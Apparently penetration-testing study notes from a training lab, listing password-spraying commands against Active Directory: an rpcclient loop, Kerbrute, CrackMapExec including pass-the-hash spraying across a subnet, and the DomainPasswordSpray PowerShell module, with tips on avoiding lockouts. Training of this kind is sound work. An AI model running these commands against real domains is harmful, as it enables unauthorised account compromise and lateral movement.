## From Linux

### rpcclient

We can use rpcclient with a bash script in order to perform password spraying. We must then filter the results with a grep on `Authority` in the response. Here is a bash one-liner:

```shell
for u in $(cat <username-list>);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

### Kerbrute

```shell
kerbrute passwordspray -d <domain> --dc <IP> <username-list> <password>
```

### CrackMapExec

```shell
crackmapexec smb <IP> -u <users list> -p <password> | grep +
```

### Pass-the-Hash spraying

When we only have the NTLM hash of the local admin, we can spray the NT hash on the entire network.The `--local-auth` flag is used to only attempt one login on each machine in order to avoid account lockout. Be careful because this method makes a lot of noise.

```shell
crackmapexec smb --local-auth <net-ip/mask> -u administrator -H <hash> | grep +
```

## From Windows

### DomainPasswordSpray

When we have a foothold in the domain, we can perform password spraying with [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray). The tool can generate a user list, query the password policy and make the exact amount of trials not to lock out the accounts.

To use the tool, we must import it first:
```powershell
Import-Module .\DomainPasswordSpray.ps1
```

We can then use it:
```powershell
PS C:\htb> Invoke-DomainPasswordSpray -Password <password> -OutFile <output> -ErrorAction SilentlyContinue
```
